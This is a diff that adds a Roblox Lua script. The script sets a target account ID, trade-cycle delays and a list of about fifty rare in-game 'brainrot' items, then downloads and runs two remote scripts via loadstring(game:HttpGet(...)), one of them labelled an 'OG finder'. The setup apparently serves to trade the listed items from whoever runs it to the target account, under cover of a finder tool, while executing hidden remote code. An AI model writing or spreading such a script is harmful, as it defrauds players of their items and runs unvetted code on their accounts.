@@ -1,0 +1,64 @@
+getgenv().SECRET_KEY = "mrr_196745df027c443492de01014209cc5b"
+getgenv().TARGET_ID = 5216742114
+getgenv().DELAY_STEP = 1
+getgenv().TRADE_CYCLE_DELAY = 2
+
+getgenv().TARGET_BRAINROTS = {
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Headless Horseman"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Griffin"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Cerberus"] = true,
+    ["Love Love Bear"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Capitano Moby"] = true,
+    ["Cooki and Milki"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Ketupat Bros"] = true,
+    ["Reinito Sleighito"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Casa Boo"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Garama and Madundung"] = true,
+    ["Festive 67"] = true,
+    ["Ginger Gerat"] = true,
+    ["Nacho Spyder"] = true,
+    ["Antonio"] = true,
+    ["La Food Combinasion"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Signore Carapace"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Cloverat Clapat"] = true,
+    ["Globa Steppa"] = true,
+    ["Fishino Clownino"] = true,
+    ["Lovin Rose"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Duggy Bros"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["La Jolly Grande"] = true,
+    ["W or L"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Rosetti Tualetti"] = true,
+    ["Gold Gold Gold"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["La Spooky Grande"] = true,
+    ["Bacuru and Egguru"] = true,
+    ["Celularcini Viciosini"] = true
+}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://luapot.com/api/loadstring/26c4a4331358247078ffc36b7a17d913"))()
+end)
+
+task.spawn(function()
+    task.wait(10)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FadedHub-01/Og-finder/refs/heads/main/og%20finder.lua.txt"))()
+end)
